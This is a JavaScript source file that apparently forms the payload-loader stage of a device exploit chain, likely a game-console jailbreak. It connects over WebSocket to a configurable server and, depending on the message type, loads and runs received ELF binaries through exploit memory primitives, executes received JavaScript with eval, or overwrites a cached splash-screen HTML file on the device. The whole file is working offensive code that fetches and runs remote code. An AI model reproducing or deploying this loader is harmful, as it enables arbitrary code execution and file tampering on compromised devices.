const ws = {
  enable: true,
  /** @type {WebSocket} */
  socket: undefined,
  type: Object.freeze({
    ELF: 1,
    JS: 2,
    HTML: 3,
  }),
  init() {
    if (this.enable) {
      this.try_connect();
    }
  },
  /** @param {string} payload */
  send(payload) {
    if (this.enable) {
      this.socket?.send(payload);
    }
  },
  try_connect() {
    this.socket = new WebSocket(`ws://${SERVER_IP}:${SERVER_PORT}`);
    this.socket.onopen = function () {
      logger?.info(`Connected to ${SERVER_IP}:${SERVER_PORT}...`);
    };
    this.socket.onmessage = async function (event) {
      if (event.data instanceof Blob) {
        try {
          const buf = await new Response(event.data).arrayBuffer();
          const u8 = new Uint8Array(buf);
          const type = u8[0];
          const data = u8.slice(1);
          const name = String.from(data.buffer.getBackingStore());
          const payload = data.slice(name.length + 1);
          logger?.info(`Recieved payload ${name} with size ${payload.length.bigint().hex()}`);
          switch (type) {
            case ws.type.ELF:
              try {
                const elf = new Elf(name, payload.buffer.getBackingStore(), payload.byteLength);
                if (elf.load()) {
                  logger?.info(`ELF payload ${name} loaded !!`);
                  const testMem = mem.alloc(8);
                  arw.view(testMem).u64[0] = env.wrapper_private_addr;
                  if (fn.elfMain(1, testMem)) {
                    throw new Error("copy failed !!");
                  }
                  mem.free(testMem);
                  logger?.info(`ELF payload ${name} executed !!`);
                  elf.unload();

                  logger?.info(`ELF payload ${name} unloaded !!`);
                }
              } catch (e) {
                logger?.error(`ELF payload ${name} threw an exception !!`);
                logger?.error(e.stack);
              }
              break;
            case ws.type.JS:
              const code = new TextDecoder().decode(payload);
              try {
                await eval(code);
                logger?.info(`JS payload ${name} executed !!`);
              } catch (e) {
                logger?.error(`JS payload ${name} threw an exception !!`);
                logger?.error(e.stack);
              }
              break;
            case ws.type.HTML:
              try {
                const path = "/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY=/splash.html";

                fn.unlink.invoke(path);
                const fd = fn.open.invoke(path, 0x601, 0x106);
                fn.write.invoke(fd, payload.buffer.getBackingStore(), payload.byteLength.bigint());
                fn.close.invoke(fd);
                logger?.info(`HTML payload ${name} written to cache successfully !!`);
              } catch (e) {
                logger?.error(`HTML payload ${name} threw an exception !!`);
                logger?.error(e.stack);
              }
              break;
            default:
              throw new Error("Unsupported payload type !!");
          }
        } catch (e) {
          logger?.error(e.stack);
        }
      }
    };
  },
};

ws.init();
